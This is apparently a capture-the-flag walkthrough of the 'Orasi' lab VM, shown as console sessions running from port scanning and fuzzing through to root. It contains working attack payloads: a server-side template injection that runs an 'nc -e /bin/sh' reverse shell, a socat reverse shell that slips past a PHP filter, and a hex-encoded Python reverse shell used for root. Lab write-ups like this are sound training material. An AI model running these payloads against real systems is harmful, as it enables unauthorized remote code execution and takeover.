# Orasi - Walkthrough 

## Port Scan
```console
┌──(alienum㉿kali)-[~]
└─$ nmap 10.0.2.176    
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-12 03:20 EET
Nmap scan report for 10.0.2.176 (10.0.2.176)
Host is up (0.00046s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
5000/tcp open  upnp
```

## FTP download the file
```console
┌──(alienum㉿kali)-[~]
└─$ ftp 10.0.2.176
Name (10.0.2.176:alienum): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Feb 11 13:25 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp         16976 Feb 07 13:27 url
226 Directory send OK.
ftp> mget url
mget url? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for url (16976 bytes).
226 Transfer complete.
16976 bytes received in 0.00 secs (8.5795 MB/s)
ftp> bye
221 Goodbye.
```

## Analyze the binary
```console
┌──(alienum㉿kali)-[~]
└─$ chmod +x url
                                                                                                              
┌──(alienum㉿kali)-[~]
└─$ ./url
Sometimes things are not obvious
Element found: 36
                                                                                                                  
┌──(alienum㉿kali)-[~]
└─$ objdump -d url

0000000000001165 <main>:
    1165:       55                      push   %rbp
    1166:       48 89 e5                mov    %rsp,%rbp
    1169:       bf 08 00 00 00          mov    $0x8,%edi
    116e:       e8 ed fe ff ff          callq  1060 <malloc@plt>
    1173:       48 89 05 a6 2f 00 00    mov    %rax,0x2fa6(%rip)        # 4120 <init>
    117a:       48 8b 05 9f 2f 00 00    mov    0x2f9f(%rip),%rax        # 4120 <init>
    1181:       c6 00 6f                movb   $0x6f,(%rax)
    1184:       48 8b 05 95 2f 00 00    mov    0x2f95(%rip),%rax        # 4120 <init>
    118b:       c7 40 04 ff ff ff ff    movl   $0xffffffff,0x4(%rax)
    1192:       be 2f 00 00 00          mov    $0x2f,%esi
    1197:       bf 01 00 00 00          mov    $0x1,%edi
    119c:       e8 0c 01 00 00          callq  12ad <insert>
    11a1:       be 73 00 00 00          mov    $0x73,%esi
    11a6:       bf 02 00 00 00          mov    $0x2,%edi
    11ab:       e8 fd 00 00 00          callq  12ad <insert>
    11b0:       be 68 00 00 00          mov    $0x68,%esi
    11b5:       bf 2a 00 00 00          mov    $0x2a,%edi
    11ba:       e8 ee 00 00 00          callq  12ad <insert>
    11bf:       be 34 00 00 00          mov    $0x34,%esi
    11c4:       bf 04 00 00 00          mov    $0x4,%edi
    11c9:       e8 df 00 00 00          callq  12ad <insert>
    11ce:       be 64 00 00 00          mov    $0x64,%esi
    11d3:       bf 0c 00 00 00          mov    $0xc,%edi
    11d8:       e8 d0 00 00 00          callq  12ad <insert>
    11dd:       be 30 00 00 00          mov    $0x30,%esi
    11e2:       bf 0e 00 00 00          mov    $0xe,%edi
    11e7:       e8 c1 00 00 00          callq  12ad <insert>
    11ec:       be 77 00 00 00          mov    $0x77,%esi
    11f1:       bf 11 00 00 00          mov    $0x11,%edi
    11f6:       e8 b2 00 00 00          callq  12ad <insert>
    11fb:       be 24 00 00 00          mov    $0x24,%esi
    1200:       bf 12 00 00 00          mov    $0x12,%edi
    1205:       e8 a3 00 00 00          callq  12ad <insert>
    120a:       be 73 00 00 00          mov    $0x73,%esi
    120f:       bf 13 00 00 00          mov    $0x13,%edi
    1214:       e8 94 00 00 00          callq  12ad <insert>
    1219:       48 8d 3d e8 0d 00 00    lea    0xde8(%rip),%rdi        # 2008 <_IO_stdin_used+0x8>
    1220:       e8 1b fe ff ff          callq  1040 <puts@plt>
    1225:       bf 12 00 00 00          mov    $0x12,%edi
```
## Hidden path
- 0x2f 0x73 0x68 0x34 0x64 0x30 0x77 0x24 0x73
- 2f 73 68 34 64 30 77 24 73
- /sh4d0w$s

## Read index.html (port 80)
```console
┌──(alienum㉿kali)-[~]
└─$ curl http://10.0.2.176/
<head>
</head>
<body>
<h1>Orasi</h1>
<br>
<p>6 6 1337leet</p>
</body>
```
## Generate wordlist using crunch
```console
┌──(alienum㉿kali)-[~/Desktop]
└─$ crunch 6 6 1337leet -o list.txt 
Crunch will now generate the following amount of data: 326592 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 46656 

crunch: 100% completed generating output
```
## Finding the parameter  (port 5000)
```console
┌──(alienum㉿kali)-[~/Desktop]
└─$ wfuzz -w  list.txt  --hh 8  'http://10.0.2.176:5000/sh4d0w$s?FUZZ=name'

Target: http://10.0.2.176:5000/sh4d0w$s?FUZZ=name
Total requests: 46656

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                          
=====================================================================

000024912:   200        0 L      1 W        4 Ch        "l333tt"
```
## Server Side Template Injection
```console
http://10.0.2.176:5000/sh4d0w$s?l333tt={{request.application.__globals__.__builtins__.__import__('os').popen('nc -e /bin/sh 10.0.2.15 4444').read()}}
```
#### Listener
```console
┌──(alienum㉿kali)-[~/Desktop]
└─$ nc -lvp 4444                                                                                              2 ⚙
listening on [any] 4444 ...
connect to [10.0.2.15] from 10.0.2.176 [10.0.2.176] 59760
/usr/bin/script -qc /bin/bash /dev/null
www-data@orasi:~/html$
```
##  PHP Jail Escape
```console
www-data@orasi:~/html$ sudo -l
User www-data may run the following commands on orasi:
    (kori) NOPASSWD: /bin/php /home/kori/jail.php *
	
ww-data@orasi:~/html$ cat /home/kori/jail.php
cat /home/kori/jail.php
...
if(preg_match('/(`|bash|eval|nc|whoami|open|pass|require|include|file|system|\/)/i', $var)) 
...
www-data@orasi:~/html$ which socat
/usr/bin/socat
www-data@orasi:~/html$ sudo -u kori /bin/php /home/kori/jail.php "socat TCP:10.0.2.15:5555 EXEC:sh"
```
#### Listener 
```console
┌──(alienum㉿kali)-[~]
└─$ nc -lvp 5555
listening on [any] 5555 ...
connect to [10.0.2.15] from 10.0.2.176 [10.0.2.176] 60606
id
uid=1001(kori) gid=1001(kori) groups=1001(kori)
```
## Copy the APK
```console
kori@orasi:~$ sudo -l
sudo -l
Matching Defaults entries for kori on orasi:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kori may run the following commands on orasi:
    (irida) NOPASSWD: /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk
kori@orasi:~$ sudo -u irida /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk
sudo -u irida /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk
/usr/bin/cp: cannot create regular file '/home/kori/irida.apk': Permission denied
kori@orasi:~$ cd ..
cd ..
kori@orasi:/home$ chmod 777 kori 
chmod 777 kori
kori@orasi:/home$ cd /home/kori
cd /home/kori
kori@orasi:~$ sudo -u irida /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk
sudo -u irida /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk
kori@orasi:~$ ls
ls
irida.apk  jail.php
kori@orasi:~$
```
## APK decompile & code analysis
```console
┌──(alienum㉿kali)-[~]
└─$ mv irida.apk irida.zip

┌──(alienum㉿kali)-[~]
└─$ unzip irida.zip

┌──(alienum㉿kali)-[~]
└─$ d2j-dex2jar classes.dex

┌──(alienum㉿kali)-[~]
└─$ mkdir irida

┌──(alienum㉿kali)-[~]
└─$ procyon classes-dex2jar.jar -o ./irida

┌──(alienum㉿kali)-[~/irida/com/alienum]
└─$ tree
.
└── irida
    ├── BuildConfig.java
    ├── data
    │   ├── LoginDataSource.java
    │   ├── LoginRepository.java
    │   ├── model
    │   │   └── LoggedInUser.java
    │   └── Result.java
    ├── R.java
    └── ui
        └── login
            ├── LoggedInUserView.java
            ├── LoginActivity.java
            ├── LoginFormState.java
            ├── LoginResult.java
            ├── LoginViewModelFactory.java
            └── LoginViewModel.java			
```
## Analyze the LoginDataSource.java
```console
┌──(alienum㉿kali)-[~/…/com/alienum/irida/data]
└─$ cat LoginDataSource.java                                                                                  1 ⨯
// 
// Decompiled by Procyon v0.5.36
// 
public class LoginDataSource
{
    public Result<LoggedInUser> login(final String s, final String s2) {
        if (s.equals("irida") && s2.equals(this.protector("1#2#3#4#5"))) {
            try {
                return (Result<LoggedInUser>)new Result.Success(new LoggedInUser(UUID.randomUUID().toString(), "Irida Orasis"));
            }
            catch (Exception cause) {
                return (Result<LoggedInUser>)new Result.Error(new IOException("Error logging in", cause));
            }
        }
        return (Result<LoggedInUser>)new Result.Error(new IOException("Error logging in", null));
    }
    
    public void logout() {
    }
    
    public String protector(String string) {
        final String[] split = string.split("#");
        final HashMap<String, String> hashMap = new HashMap<String, String>();
        hashMap.put(split[0], "<redacted0>");
        hashMap.put(split[3], "<redacted3>");
        hashMap.put(split[4], "<redacted4>");
        hashMap.put(split[1], "<redacted1>");
        hashMap.put(split[2], "<redacted2>");
        final StringBuilder sb = new StringBuilder();
        sb.append(hashMap.get(split[0]));
        sb.append(".");
        sb.append(hashMap.get(split[1]));
        sb.append(".");
        sb.append(hashMap.get(split[2]));
        sb.append(".");
        sb.append(hashMap.get(split[3]));
        sb.append(".");
        sb.append(hashMap.get(split[4]));
        string = sb.toString();
        System.out.println(string);
        return string;
    }
}
```
## SSH as irida
#### Reading the hint
hint : after user1 shell, user2 allows user1 to analyze the file, because user2 made a little mistake with his password, just one more useless little dot.
- wrong password = ```<redacted0>.<redacted1>.<redacted2>.<redacted3>.<redacted4>```
- correct password = ```<redacted0>.<redacted1>.<redacted2>.<redacted3><redacted4>```
- There is no dot between ```<redacted3>``` and ```<redacted4>```

```console
┌──(alienum㉿kali)-[~]
└─$ ssh irida@10.0.2.176
irida@10.0.2.176's password: <redacted0>.<redacted1>.<redacted2>.<redacted3><redacted4>

irida@orasi:~$ ls
irida.apk  user.txt
irida@orasi:~$
```
## String to Hex
```console
__import__('os').system('nc -e /bin/sh 10.0.2.15 1234')
5f5f696d706f72745f5f28276f7327292e73797374656d28276e63202d65202f62696e2f73682031302e302e322e313520313233342729
```
## Root shell
#### Orasi VM
```console
irida@orasi:~$ sudo -l
Matching Defaults entries for irida on orasi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User irida may run the following commands on orasi:
    (root) NOPASSWD: /usr/bin/python3 /root/oras.py
irida@orasi:~$ sudo -u root /usr/bin/python3 /root/oras.py
: 5f5f696d706f72745f5f28276f7327292e73797374656d28276e63202d65202f62696e2f73682031302e302e322e313520313233342729
```
#### My Listener
```console
┌──(alienum㉿kali)-[~]
└─$ nc -lvp 1234                                                                                              1 ⚙
listening on [any] 1234 ...
connect to [10.0.2.15] from 10.0.2.176 [10.0.2.176] 33580
/usr/bin/script -qc /bin/bash /dev/null
root@orasi:/home/irida# cd
cd
root@orasi:~# ls
ls
oras.py  root.txt
root@orasi:~#
```
